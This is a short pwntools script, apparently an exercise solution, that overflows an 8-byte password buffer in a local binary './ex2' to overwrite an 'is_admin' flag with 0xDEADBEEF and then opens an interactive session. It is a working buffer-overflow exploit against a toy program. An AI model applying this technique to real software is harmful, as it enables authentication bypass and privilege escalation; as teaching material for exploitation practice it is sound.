#!/usr/bin/env python3

from pwn import *

# Open the binary as a process
target = process("./ex2")  # Ensure the path to ex2 is correct

# Crafting the payload
# Fill the password buffer (8 bytes), then overwrite 'is_admin' (8 bytes)
payload = b'a' * 8 + p64(0xDEADBEEF)  # p64 because 'is_admin' is a long (8 bytes)

# Sending the payload
target.sendline(payload)  # Use sendline to send the payload with a newline

# Switch to interactive mode to see output
target.interactive()
